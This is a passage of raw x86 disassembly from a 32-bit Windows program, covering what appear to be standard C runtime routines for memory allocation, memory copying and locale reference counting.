  425f7f:	call   0x4253bb
  425f84:	pop    ecx
  425f85:	ret    
  425f86:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  425f8b:	ja     0x425faf
  425f8d:	push   DWORD PTR [esp+0x4]
  425f91:	call   0x425f0b
  425f96:	test   eax,eax
  425f98:	pop    ecx
  425f99:	jne    0x425fb1
  425f9b:	cmp    DWORD PTR [esp+0x8],eax
  425f9f:	je     0x425fb1
  425fa1:	push   DWORD PTR [esp+0x4]
  425fa5:	call   0x427b72
  425faa:	test   eax,eax
  425fac:	pop    ecx
  425fad:	jne    0x425f8d
  425faf:	xor    eax,eax
  425fb1:	ret    
  425fb2:	push   DWORD PTR ds:0x467388
  425fb8:	push   DWORD PTR [esp+0x8]
  425fbc:	call   0x425f86
  425fc1:	pop    ecx
  425fc2:	pop    ecx
  425fc3:	ret    
  425fc4:	int3   
  425fc5:	int3   
  425fc6:	int3   
  425fc7:	int3   
  425fc8:	int3   
  425fc9:	int3   
  425fca:	int3   
  425fcb:	int3   
  425fcc:	int3   
  425fcd:	int3   
  425fce:	int3   
  425fcf:	int3   
  425fd0:	push   ebp
  425fd1:	mov    ebp,esp
  425fd3:	push   edi
  425fd4:	push   esi
  425fd5:	mov    esi,DWORD PTR [ebp+0xc]
  425fd8:	mov    ecx,DWORD PTR [ebp+0x10]
  425fdb:	mov    edi,DWORD PTR [ebp+0x8]
  425fde:	mov    eax,ecx
  425fe0:	mov    edx,ecx
  425fe2:	add    eax,esi
  425fe4:	cmp    edi,esi
  425fe6:	jbe    0x425ff0
  425fe8:	cmp    edi,eax
  425fea:	jb     0x42616c
  425ff0:	test   edi,0x3
  425ff6:	jne    0x42600c
  425ff8:	shr    ecx,0x2
  425ffb:	and    edx,0x3
  425ffe:	cmp    ecx,0x8
  426001:	jb     0x42602c
  426003:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426005:	jmp    DWORD PTR [edx*4+0x42611c]
  42600c:	mov    eax,edi
  42600e:	mov    edx,0x3
  426013:	sub    ecx,0x4
  426016:	jb     0x426024
  426018:	and    eax,0x3
  42601b:	add    ecx,eax
  42601d:	jmp    DWORD PTR [eax*4+0x426030]
  426024:	jmp    DWORD PTR [ecx*4+0x42612c]
  42602b:	nop
  42602c:	jmp    DWORD PTR [ecx*4+0x4260b0]
  426033:	nop
  426034:	inc    eax
  426035:	pusha  
  426036:	inc    edx
  426037:	add    BYTE PTR [eax+eiz*2+0x42],ch
  42603b:	add    BYTE PTR [eax+0x23004260],dl
  426041:	ror    DWORD PTR [edx-0x75f877fa],1
  426047:	inc    esi
  426048:	add    DWORD PTR [eax+0x468a0147],ecx
  42604e:	add    al,cl
  426050:	jmp    0x289e857
  426055:	add    esi,0x3
  426058:	add    edi,0x3
  42605b:	cmp    ecx,0x8
  42605e:	jb     0x42602c
  426060:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426062:	jmp    DWORD PTR [edx*4+0x42611c]
  426069:	lea    ecx,[ecx+0x0]
  42606c:	and    edx,ecx
  42606e:	mov    al,BYTE PTR [esi]
  426070:	mov    BYTE PTR [edi],al
  426072:	mov    al,BYTE PTR [esi+0x1]
  426075:	shr    ecx,0x2
  426078:	mov    BYTE PTR [edi+0x1],al
  42607b:	add    esi,0x2
  42607e:	add    edi,0x2
  426081:	cmp    ecx,0x8
  426084:	jb     0x42602c
  426086:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426088:	jmp    DWORD PTR [edx*4+0x42611c]
  42608f:	nop
  426090:	and    edx,ecx
  426092:	mov    al,BYTE PTR [esi]
  426094:	mov    BYTE PTR [edi],al
  426096:	add    esi,0x1
  426099:	shr    ecx,0x2
  42609c:	add    edi,0x1
  42609f:	cmp    ecx,0x8
  4260a2:	jb     0x42602c
  4260a4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260a6:	jmp    DWORD PTR [edx*4+0x42611c]
  4260ad:	lea    ecx,[ecx+0x0]
  4260b0:	adc    esp,DWORD PTR [ecx+0x42]
  4260b3:	add    BYTE PTR [eax],al
  4260b5:	popa   
  4260b6:	inc    edx
  4260b7:	add    al,bh
  4260b9:	pusha  
  4260ba:	inc    edx
  4260bb:	add    al,dh
  4260bd:	pusha  
  4260be:	inc    edx
  4260bf:	add    al,ch
  4260c1:	pusha  
  4260c2:	inc    edx
  4260c3:	add    al,ah
  4260c5:	pusha  
  4260c6:	inc    edx
  4260c7:	add    al,bl
  4260c9:	pusha  
  4260ca:	inc    edx
  4260cb:	add    al,dl
  4260cd:	pusha  
  4260ce:	inc    edx
  4260cf:	add    BYTE PTR [ebx-0x761b71bc],cl
  4260d5:	inc    esp
  4260d6:	(bad)  
  4260d7:	in     al,0x8b
  4260d9:	inc    esp
  4260da:	mov    gs,eax
  4260dc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4260e0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4260e4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4260e8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4260ec:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4260f0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4260f4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4260f8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4260fc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426100:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426104:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426108:	lea    eax,[ecx*4+0x0]
  42610f:	add    esi,eax
  426111:	add    edi,eax
  426113:	jmp    DWORD PTR [edx*4+0x42611c]
  42611a:	mov    edi,edi
  42611c:	sub    al,0x61
  42611e:	inc    edx
  42611f:	add    BYTE PTR [ecx+eiz*2],dh
  426122:	inc    edx
  426123:	add    BYTE PTR [eax+0x61],al
  426126:	inc    edx
  426127:	add    BYTE PTR [ecx+eiz*2+0x42],dl
  42612b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426131:	leave  
  426132:	ret    
  426133:	nop
  426134:	mov    al,BYTE PTR [esi]
  426136:	mov    BYTE PTR [edi],al
  426138:	mov    eax,DWORD PTR [ebp+0x8]
  42613b:	pop    esi
  42613c:	pop    edi
  42613d:	leave  
  42613e:	ret    
  42613f:	nop
  426140:	mov    al,BYTE PTR [esi]
  426142:	mov    BYTE PTR [edi],al
  426144:	mov    al,BYTE PTR [esi+0x1]
  426147:	mov    BYTE PTR [edi+0x1],al
  42614a:	mov    eax,DWORD PTR [ebp+0x8]
  42614d:	pop    esi
  42614e:	pop    edi
  42614f:	leave  
  426150:	ret    
  426151:	lea    ecx,[ecx+0x0]
  426154:	mov    al,BYTE PTR [esi]
  426156:	mov    BYTE PTR [edi],al
  426158:	mov    al,BYTE PTR [esi+0x1]
  42615b:	mov    BYTE PTR [edi+0x1],al
  42615e:	mov    al,BYTE PTR [esi+0x2]
  426161:	mov    BYTE PTR [edi+0x2],al
  426164:	mov    eax,DWORD PTR [ebp+0x8]
  426167:	pop    esi
  426168:	pop    edi
  426169:	leave  
  42616a:	ret    
  42616b:	nop
  42616c:	lea    esi,[ecx+esi*1-0x4]
  426170:	lea    edi,[ecx+edi*1-0x4]
  426174:	test   edi,0x3
  42617a:	jne    0x4261a0
  42617c:	shr    ecx,0x2
  42617f:	and    edx,0x3
  426182:	cmp    ecx,0x8
  426185:	jb     0x426194
  426187:	std    
  426188:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42618a:	cld    
  42618b:	jmp    DWORD PTR [edx*4+0x4262b8]
  426192:	mov    edi,edi
  426194:	neg    ecx
  426196:	jmp    DWORD PTR [ecx*4+0x426268]
  42619d:	lea    ecx,[ecx+0x0]
  4261a0:	mov    eax,edi
  4261a2:	mov    edx,0x3
  4261a7:	cmp    ecx,0x4
  4261aa:	jb     0x4261b8
  4261ac:	and    eax,0x3
  4261af:	sub    ecx,eax
  4261b1:	jmp    DWORD PTR [eax*4+0x4261bc]
  4261b8:	jmp    DWORD PTR [ecx*4+0x4262b8]
  4261bf:	nop
  4261c0:	int3   
  4261c1:	popa   
  4261c2:	inc    edx
  4261c3:	add    al,dh
  4261c5:	popa   
  4261c6:	inc    edx
  4261c7:	add    BYTE PTR [eax],bl
  4261c9:	bound  eax,QWORD PTR [edx+0x0]
  4261cc:	mov    al,BYTE PTR [esi+0x3]
  4261cf:	and    edx,ecx
  4261d1:	mov    BYTE PTR [edi+0x3],al
  4261d4:	sub    esi,0x1
  4261d7:	shr    ecx,0x2
  4261da:	sub    edi,0x1
  4261dd:	cmp    ecx,0x8
  4261e0:	jb     0x426194
  4261e2:	std    
  4261e3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261e5:	cld    
  4261e6:	jmp    DWORD PTR [edx*4+0x4262b8]
  4261ed:	lea    ecx,[ecx+0x0]
  4261f0:	mov    al,BYTE PTR [esi+0x3]
  4261f3:	and    edx,ecx
  4261f5:	mov    BYTE PTR [edi+0x3],al
  4261f8:	mov    al,BYTE PTR [esi+0x2]
  4261fb:	shr    ecx,0x2
  4261fe:	mov    BYTE PTR [edi+0x2],al
  426201:	sub    esi,0x2
  426204:	sub    edi,0x2
  426207:	cmp    ecx,0x8
  42620a:	jb     0x426194
  42620c:	std    
  42620d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42620f:	cld    
  426210:	jmp    DWORD PTR [edx*4+0x4262b8]
  426217:	nop
  426218:	mov    al,BYTE PTR [esi+0x3]
  42621b:	and    edx,ecx
  42621d:	mov    BYTE PTR [edi+0x3],al
  426220:	mov    al,BYTE PTR [esi+0x2]
  426223:	mov    BYTE PTR [edi+0x2],al
  426226:	mov    al,BYTE PTR [esi+0x1]
  426229:	shr    ecx,0x2
  42622c:	mov    BYTE PTR [edi+0x1],al
  42622f:	sub    esi,0x3
  426232:	sub    edi,0x3
  426235:	cmp    ecx,0x8
  426238:	jb     0x426194
  42623e:	std    
  42623f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426241:	cld    
  426242:	jmp    DWORD PTR [edx*4+0x4262b8]
  426249:	lea    ecx,[ecx+0x0]
  42624c:	ins    BYTE PTR es:[edi],dx
  42624d:	bound  eax,QWORD PTR [edx+0x0]
  426250:	je     0x4262b4
  426252:	inc    edx
  426253:	add    BYTE PTR [edx+eiz*2+0x42],bh
  426257:	add    BYTE PTR [edx+eiz*2+0x628c0042],al
  42625e:	inc    edx
  42625f:	add    BYTE PTR [edx+eiz*2+0x629c0042],dl
  426266:	inc    edx
  426267:	add    BYTE PTR [edi-0x74ffbd9e],ch
  42626d:	inc    esp
  42626e:	mov    ds,WORD PTR [ecx+ecx*4]
  426271:	inc    esp
  426272:	(bad)  
  426273:	sbb    al,0x8b
  426275:	inc    esp
  426276:	mov    ds,WORD PTR [eax]
  426278:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42627c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426280:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426284:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426288:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42628c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426290:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426294:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426298:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42629c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4262a0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4262a4:	lea    eax,[ecx*4+0x0]
  4262ab:	add    esi,eax
  4262ad:	add    edi,eax
  4262af:	jmp    DWORD PTR [edx*4+0x4262b8]
  4262b6:	mov    edi,edi
  4262b8:	enter  0x4262,0x0
  4262bc:	shl    BYTE PTR [edx+0x42],1
  4262bf:	add    al,ah
  4262c1:	bound  eax,QWORD PTR [edx+0x0]
  4262c4:	hlt    
  4262c5:	bound  eax,QWORD PTR [edx+0x0]
  4262c8:	mov    eax,DWORD PTR [ebp+0x8]
  4262cb:	pop    esi
  4262cc:	pop    edi
  4262cd:	leave  
  4262ce:	ret    
  4262cf:	nop
  4262d0:	mov    al,BYTE PTR [esi+0x3]
  4262d3:	mov    BYTE PTR [edi+0x3],al
  4262d6:	mov    eax,DWORD PTR [ebp+0x8]
  4262d9:	pop    esi
  4262da:	pop    edi
  4262db:	leave  
  4262dc:	ret    
  4262dd:	lea    ecx,[ecx+0x0]
  4262e0:	mov    al,BYTE PTR [esi+0x3]
  4262e3:	mov    BYTE PTR [edi+0x3],al
  4262e6:	mov    al,BYTE PTR [esi+0x2]
  4262e9:	mov    BYTE PTR [edi+0x2],al
  4262ec:	mov    eax,DWORD PTR [ebp+0x8]
  4262ef:	pop    esi
  4262f0:	pop    edi
  4262f1:	leave  
  4262f2:	ret    
  4262f3:	nop
  4262f4:	mov    al,BYTE PTR [esi+0x3]
  4262f7:	mov    BYTE PTR [edi+0x3],al
  4262fa:	mov    al,BYTE PTR [esi+0x2]
  4262fd:	mov    BYTE PTR [edi+0x2],al
  426300:	mov    al,BYTE PTR [esi+0x1]
  426303:	mov    BYTE PTR [edi+0x1],al
  426306:	mov    eax,DWORD PTR [ebp+0x8]
  426309:	pop    esi
  42630a:	pop    edi
  42630b:	leave  
  42630c:	ret    
  42630d:	push   DWORD PTR [esp+0x4]
  426311:	call   DWORD PTR ds:0x4290e0
  426317:	xor    eax,eax
  426319:	inc    eax
  42631a:	ret    0x8
  42631d:	push   0x10
  42631f:	push   0x429618
  426324:	call   0x425290
  426329:	mov    eax,ds:0x467348
  42632e:	test   eax,eax
  426330:	jne    0x426369
  426332:	cmp    DWORD PTR ds:0x467084,0x1
  426339:	je     0x42635f
  42633b:	push   0x429604
  426340:	call   DWORD PTR ds:0x429044
  426346:	test   eax,eax
  426348:	je     0x42635f
  42634a:	push   0x4295dc
  42634f:	push   eax
  426350:	call   DWORD PTR ds:0x429048
  426356:	mov    ds:0x467348,eax
  42635b:	test   eax,eax
  42635d:	jne    0x426369
  42635f:	mov    eax,0x42630d
  426364:	mov    ds:0x467348,eax
  426369:	and    DWORD PTR [ebp-0x4],0x0
  42636d:	push   DWORD PTR [ebp+0xc]
  426370:	push   DWORD PTR [ebp+0x8]
  426373:	call   eax
  426375:	mov    DWORD PTR [ebp-0x1c],eax
  426378:	jmp    0x42639e
  42637a:	mov    eax,DWORD PTR [ebp-0x14]
  42637d:	mov    eax,DWORD PTR [eax]
  42637f:	mov    eax,DWORD PTR [eax]
  426381:	mov    DWORD PTR [ebp-0x20],eax
  426384:	xor    eax,eax
  426386:	inc    eax
  426387:	ret    
  426388:	mov    esp,DWORD PTR [ebp-0x18]
  42638b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426392:	jne    0x42639c
  426394:	push   0x8
  426396:	call   DWORD PTR ds:0x4290b0
  42639c:	xor    eax,eax
  42639e:	or     DWORD PTR [ebp-0x4],0xffffffff
  4263a2:	call   0x4252cb
  4263a7:	ret    
  4263a8:	push   0x10
  4263aa:	push   0x429628
  4263af:	call   0x425290
  4263b4:	mov    esi,DWORD PTR [ebp+0x8]
  4263b7:	imul   esi,DWORD PTR [ebp+0xc]
  4263bb:	mov    DWORD PTR [ebp-0x1c],esi
  4263be:	test   esi,esi
  4263c0:	jne    0x4263c3
  4263c2:	inc    esi
  4263c3:	xor    edi,edi
  4263c5:	mov    DWORD PTR [ebp-0x20],edi
  4263c8:	cmp    esi,0xffffffe0
  4263cb:	ja     0x426432
  4263cd:	cmp    DWORD PTR ds:0x467704,0x3
  4263d4:	jne    0x42641d
  4263d6:	add    esi,0xf
  4263d9:	and    esi,0xfffffff0
  4263dc:	mov    DWORD PTR [ebp+0xc],esi
  4263df:	mov    ebx,DWORD PTR [ebp-0x1c]
  4263e2:	cmp    ebx,DWORD PTR ds:0x4674c4
  4263e8:	ja     0x42641d
  4263ea:	push   0x4
  4263ec:	call   0x42544f
  4263f1:	pop    ecx
  4263f2:	and    DWORD PTR [ebp-0x4],edi
  4263f5:	push   ebx
  4263f6:	call   0x426e51
  4263fb:	pop    ecx
  4263fc:	mov    DWORD PTR [ebp-0x20],eax
  4263ff:	or     DWORD PTR [ebp-0x4],0xffffffff
  426403:	call   0x426452
  426408:	mov    edi,DWORD PTR [ebp-0x20]
  42640b:	test   edi,edi
  42640d:	je     0x426421
  42640f:	push   DWORD PTR [ebp-0x1c]
  426412:	push   0x0
  426414:	push   edi
  426415:	call   0x427b90
  42641a:	add    esp,0xc
  42641d:	test   edi,edi
  42641f:	jne    0x42645b
  426421:	push   esi
  426422:	push   0x8
  426424:	push   DWORD PTR ds:0x467700
  42642a:	call   DWORD PTR ds:0x4290dc
  426430:	mov    edi,eax
  426432:	test   edi,edi
  426434:	jne    0x42645b
  426436:	cmp    DWORD PTR ds:0x467388,edi
  42643c:	je     0x42645b
  42643e:	push   esi
  42643f:	call   0x427b72
  426444:	pop    ecx
  426445:	test   eax,eax
  426447:	jne    0x4263c3
  42644d:	jmp    0x42645d
  42644f:	mov    esi,DWORD PTR [ebp+0xc]
  426452:	push   0x4
  426454:	call   0x4253bb
  426459:	pop    ecx
  42645a:	ret    
  42645b:	mov    eax,edi
  42645d:	call   0x4252cb
  426462:	ret    
  426463:	push   esi
  426464:	mov    esi,DWORD PTR [esp+0x8]
  426468:	mov    eax,DWORD PTR [esi+0x3c]
  42646b:	push   edi
  42646c:	xor    edi,edi
  42646e:	cmp    eax,DWORD PTR ds:0x467394
  426474:	je     0x4264d9
  426476:	cmp    eax,edi
  426478:	je     0x4264d9
  42647a:	mov    eax,DWORD PTR [esi+0x2c]
  42647d:	cmp    DWORD PTR [eax],edi
  42647f:	jne    0x4264d9
  426481:	mov    eax,DWORD PTR [esi+0x34]
  426484:	cmp    eax,edi
  426486:	je     0x4264a4
  426488:	cmp    DWORD PTR [eax],edi
  42648a:	jne    0x4264a4
  42648c:	cmp    eax,DWORD PTR ds:0x4674b0
  426492:	je     0x4264a4
  426494:	push   eax
  426495:	call   0x425e9a
  42649a:	push   DWORD PTR [esi+0x3c]
  42649d:	call   0x427ddf
  4264a2:	pop    ecx
  4264a3:	pop    ecx
  4264a4:	mov    eax,DWORD PTR [esi+0x30]
  4264a7:	cmp    eax,edi
  4264a9:	je     0x4264c7
  4264ab:	cmp    DWORD PTR [eax],edi
  4264ad:	jne    0x4264c7
  4264af:	cmp    eax,DWORD PTR ds:0x4674b4
  4264b5:	je     0x4264c7
  4264b7:	push   eax
  4264b8:	call   0x425e9a
  4264bd:	push   DWORD PTR [esi+0x3c]
  4264c0:	call   0x427d80
  4264c5:	pop    ecx
  4264c6:	pop    ecx
  4264c7:	push   DWORD PTR [esi+0x2c]
  4264ca:	call   0x425e9a
  4264cf:	push   DWORD PTR [esi+0x3c]
  4264d2:	call   0x425e9a
  4264d7:	pop    ecx
  4264d8:	pop    ecx
  4264d9:	mov    eax,DWORD PTR [esi+0x40]
  4264dc:	cmp    eax,DWORD PTR ds:0x4674ac
  4264e2:	je     0x4264fc
  4264e4:	cmp    eax,edi
  4264e6:	je     0x4264fc
  4264e8:	cmp    DWORD PTR [eax],edi
  4264ea:	jne    0x4264fc
  4264ec:	push   eax
  4264ed:	call   0x425e9a
  4264f2:	push   DWORD PTR [esi+0x44]
  4264f5:	call   0x425e9a
  4264fa:	pop    ecx
  4264fb:	pop    ecx
  4264fc:	mov    eax,DWORD PTR [esi+0x50]
  4264ff:	cmp    eax,DWORD PTR ds:0x467390
  426505:	je     0x426523
  426507:	cmp    eax,edi
  426509:	je     0x426523
  42650b:	cmp    DWORD PTR [eax+0xb4],edi
  426511:	jne    0x426523
  426513:	push   eax
  426514:	call   0x427bf0
  426519:	push   DWORD PTR [esi+0x50]
  42651c:	call   0x425e9a
  426521:	pop    ecx
  426522:	pop    ecx
  426523:	push   esi
  426524:	call   0x425e9a
  426529:	pop    ecx
  42652a:	pop    edi
  42652b:	pop    esi
  42652c:	ret    
  42652d:	push   esi
  42652e:	call   0x425145
  426533:	mov    esi,eax
  426535:	mov    eax,DWORD PTR [esi+0x64]
  426538:	cmp    eax,DWORD PTR ds:0x466b4c
  42653e:	je     0x4265ea
  426544:	test   eax,eax
  426546:	je     0x426577
  426548:	mov    ecx,DWORD PTR [eax+0x2c]
  42654b:	dec    DWORD PTR [eax]
  42654d:	test   ecx,ecx
  42654f:	je     0x426553
  426551:	dec    DWORD PTR [ecx]
  426553:	mov    ecx,DWORD PTR [eax+0x34]
  426556:	test   ecx,ecx
  426558:	je     0x42655c
  42655a:	dec    DWORD PTR [ecx]
  42655c:	mov    ecx,DWORD PTR [eax+0x30]
  42655f:	test   ecx,ecx
  426561:	je     0x426565
  426563:	dec    DWORD PTR [ecx]
  426565:	mov    ecx,DWORD PTR [eax+0x40]
  426568:	test   ecx,ecx
  42656a:	je     0x42656e
  42656c:	dec    DWORD PTR [ecx]
  42656e:	mov    ecx,DWORD PTR [eax+0x4c]
  426571:	dec    DWORD PTR [ecx+0xb4]
  426577:	mov    ecx,DWORD PTR ds:0x466b4c
  42657d:	mov    DWORD PTR [esi+0x64],ecx
  426580:	mov    ecx,DWORD PTR ds:0x466b4c
  426586:	inc    DWORD PTR [ecx]
  426588:	mov    ecx,DWORD PTR ds:0x466b4c
  42658e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426591:	test   ecx,ecx
  426593:	je     0x426597
  426595:	inc    DWORD PTR [ecx]
  426597:	mov    ecx,DWORD PTR ds:0x466b4c
  42659d:	mov    ecx,DWORD PTR [ecx+0x34]
  4265a0:	test   ecx,ecx
  4265a2:	je     0x4265a6
  4265a4:	inc    DWORD PTR [ecx]
  4265a6:	mov    ecx,DWORD PTR ds:0x466b4c
  4265ac:	mov    ecx,DWORD PTR [ecx+0x30]
  4265af:	test   ecx,ecx
  4265b1:	je     0x4265b5
  4265b3:	inc    DWORD PTR [ecx]
  4265b5:	mov    ecx,DWORD PTR ds:0x466b4c
  4265bb:	mov    ecx,DWORD PTR [ecx+0x40]
  4265be:	test   ecx,ecx
  4265c0:	je     0x4265c4
  4265c2:	inc    DWORD PTR [ecx]
  4265c4:	mov    ecx,DWORD PTR ds:0x466b4c
  4265ca:	mov    ecx,DWORD PTR [ecx+0x4c]
  4265cd:	inc    DWORD PTR [ecx+0xb4]
  4265d3:	test   eax,eax
  4265d5:	je     0x4265ea
  4265d7:	cmp    DWORD PTR [eax],0x0
  4265da:	jne    0x4265ea
  4265dc:	cmp    eax,0x466af8
  4265e1:	je     0x4265ea
  4265e3:	push   eax
  4265e4:	call   0x426463
  4265e9:	pop    ecx
  4265ea:	mov    eax,DWORD PTR [esi+0x64]
  4265ed:	pop    esi
  4265ee:	ret    
  4265ef:	push   0xc
  4265f1:	push   0x4297b8
  4265f6:	call   0x425290
  4265fb:	push   0xc
  4265fd:	call   0x42544f
  426602:	pop    ecx
  426603:	and    DWORD PTR [ebp-0x4],0x0
  426607:	call   0x42652d
  42660c:	mov    DWORD PTR [ebp-0x1c],eax
  42660f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426613:	call   0x426621
  426618:	mov    eax,DWORD PTR [ebp-0x1c]
  42661b:	call   0x4252cb
  426620:	ret    
  426621:	push   0xc
  426623:	call   0x4253bb
  426628:	pop    ecx
  426629:	ret    
  42662a:	push   0x140
  42662f:	push   0x0
  426631:	push   DWORD PTR ds:0x467700
  426637:	call   DWORD PTR ds:0x4290dc
  42663d:	test   eax,eax
  42663f:	mov    ds:0x4674c0,eax
  426644:	jne    0x426647
  426646:	ret    
  426647:	mov    ecx,DWORD PTR [esp+0x4]
  42664b:	and    DWORD PTR ds:0x4674b8,0x0
  426652:	and    DWORD PTR ds:0x4674bc,0x0
  426659:	mov    ds:0x4674c8,eax
  42665e:	xor    eax,eax
  426660:	mov    DWORD PTR ds:0x4674c4,ecx
  426666:	mov    DWORD PTR ds:0x4674cc,0x10
  426670:	inc    eax
  426671:	ret    
  426672:	mov    eax,ds:0x4674bc
  426677:	lea    ecx,[eax+eax*4]
  42667a:	mov    eax,ds:0x4674c0
  42667f:	lea    ecx,[eax+ecx*4]
  426682:	jmp    0x426696
  426684:	mov    edx,DWORD PTR [esp+0x4]
  426688:	sub    edx,DWORD PTR [eax+0xc]
  42668b:	cmp    edx,0x100000
  426691:	jb     0x42669c
  426693:	add    eax,0x14
  426696:	cmp    eax,ecx
  426698:	jb     0x426684
  42669a:	xor    eax,eax
  42669c:	ret    
  42669d:	push   ebp
  42669e:	mov    ebp,esp
  4266a0:	sub    esp,0x10
  4266a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4266a6:	mov    eax,DWORD PTR [ecx+0x10]
  4266a9:	push   esi
  4266aa:	mov    esi,DWORD PTR [ebp+0xc]
  4266ad:	push   edi
  4266ae:	mov    edi,esi
  4266b0:	sub    edi,DWORD PTR [ecx+0xc]
  4266b3:	add    esi,0xfffffffc
  4266b6:	shr    edi,0xf
  4266b9:	mov    ecx,edi
  4266bb:	imul   ecx,ecx,0x204
  4266c1:	lea    ecx,[ecx+eax*1+0x144]
  4266c8:	mov    DWORD PTR [ebp-0x10],ecx
  4266cb:	mov    ecx,DWORD PTR [esi]
  4266cd:	dec    ecx
  4266ce:	test   cl,0x1
  4266d1:	mov    DWORD PTR [ebp-0x4],ecx
  4266d4:	jne    0x4269b1
  4266da:	push   ebx
  4266db:	lea    ebx,[ecx+esi*1]
  4266de:	mov    edx,DWORD PTR [ebx]
  4266e0:	mov    DWORD PTR [ebp-0xc],edx
  4266e3:	mov    edx,DWORD PTR [esi-0x4]
  4266e6:	mov    DWORD PTR [ebp-0x8],edx
  4266e9:	mov    edx,DWORD PTR [ebp-0xc]
  4266ec:	test   dl,0x1
  4266ef:	mov    DWORD PTR [ebp+0xc],ebx
  4266f2:	jne    0x426768
  4266f4:	sar    edx,0x4
  4266f7:	dec    edx
  4266f8:	cmp    edx,0x3f
  4266fb:	jbe    0x426700
  4266fd:	push   0x3f
  4266ff:	pop    edx
  426700:	mov    ecx,DWORD PTR [ebx+0x4]
  426703:	cmp    ecx,DWORD PTR [ebx+0x8]
  426706:	jne    0x42674a
  426708:	cmp    edx,0x20
  42670b:	mov    ebx,0x80000000
  426710:	jae    0x42672b
  426712:	mov    ecx,edx
  426714:	shr    ebx,cl
  426716:	lea    ecx,[edx+eax*1+0x4]
  42671a:	not    ebx
  42671c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  426720:	dec    BYTE PTR [ecx]
  426722:	jne    0x426747
  426724:	mov    ecx,DWORD PTR [ebp+0x8]
  426727:	and    DWORD PTR [ecx],ebx
  426729:	jmp    0x426747
  42672b:	lea    ecx,[edx-0x20]
  42672e:	shr    ebx,cl
  426730:	lea    ecx,[edx+eax*1+0x4]
  426734:	not    ebx
  426736:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  42673d:	dec    BYTE PTR [ecx]
  42673f:	jne    0x426747
  426741:	mov    ecx,DWORD PTR [ebp+0x8]
  426744:	and    DWORD PTR [ecx+0x4],ebx
  426747:	mov    ebx,DWORD PTR [ebp+0xc]
  42674a:	mov    edx,DWORD PTR [ebx+0x8]
  42674d:	mov    ebx,DWORD PTR [ebx+0x4]
  426750:	mov    ecx,DWORD PTR [ebp-0x4]
  426753:	add    ecx,DWORD PTR [ebp-0xc]
  426756:	mov    DWORD PTR [edx+0x4],ebx
  426759:	mov    edx,DWORD PTR [ebp+0xc]
  42675c:	mov    ebx,DWORD PTR [edx+0x4]
  42675f:	mov    edx,DWORD PTR [edx+0x8]
  426762:	mov    DWORD PTR [ebx+0x8],edx
  426765:	mov    DWORD PTR [ebp-0x4],ecx
  426768:	mov    edx,ecx
  42676a:	sar    edx,0x4
  42676d:	dec    edx
  42676e:	cmp    edx,0x3f
  426771:	jbe    0x426776
  426773:	push   0x3f
  426775:	pop    edx
  426776:	mov    ebx,DWORD PTR [ebp-0x8]
  426779:	and    ebx,0x1
  42677c:	mov    DWORD PTR [ebp-0xc],ebx
  42677f:	jne    0x426814
  426785:	sub    esi,DWORD PTR [ebp-0x8]
  426788:	mov    ebx,DWORD PTR [ebp-0x8]
  42678b:	sar    ebx,0x4
  42678e:	push   0x3f
  426790:	mov    DWORD PTR [ebp+0xc],esi
  426793:	dec    ebx
  426794:	pop    esi
  426795:	cmp    ebx,esi
  426797:	jbe    0x42679b
  426799:	mov    ebx,esi
  42679b:	add    ecx,DWORD PTR [ebp-0x8]
  42679e:	mov    edx,ecx
  4267a0:	sar    edx,0x4
  4267a3:	dec    edx
  4267a4:	cmp    edx,esi
  4267a6:	mov    DWORD PTR [ebp-0x4],ecx
  4267a9:	jbe    0x4267ad
  4267ab:	mov    edx,esi
  4267ad:	cmp    ebx,edx
  4267af:	je     0x42680f
  4267b1:	mov    ecx,DWORD PTR [ebp+0xc]
  4267b4:	mov    esi,DWORD PTR [ecx+0x4]
  4267b7:	cmp    esi,DWORD PTR [ecx+0x8]
  4267ba:	jne    0x4267f7
  4267bc:	cmp    ebx,0x20
  4267bf:	mov    esi,0x80000000
  4267c4:	jae    0x4267dd
  4267c6:	mov    ecx,ebx
  4267c8:	shr    esi,cl
  4267ca:	not    esi
  4267cc:	and    DWORD PTR [eax+edi*4+0x44],esi
  4267d0:	dec    BYTE PTR [ebx+eax*1+0x4]
  4267d4:	jne    0x4267f7
  4267d6:	mov    ecx,DWORD PTR [ebp+0x8]
  4267d9:	and    DWORD PTR [ecx],esi
  4267db:	jmp    0x4267f7
  4267dd:	lea    ecx,[ebx-0x20]
  4267e0:	shr    esi,cl
  4267e2:	not    esi
  4267e4:	and    DWORD PTR [eax+edi*4+0xc4],esi
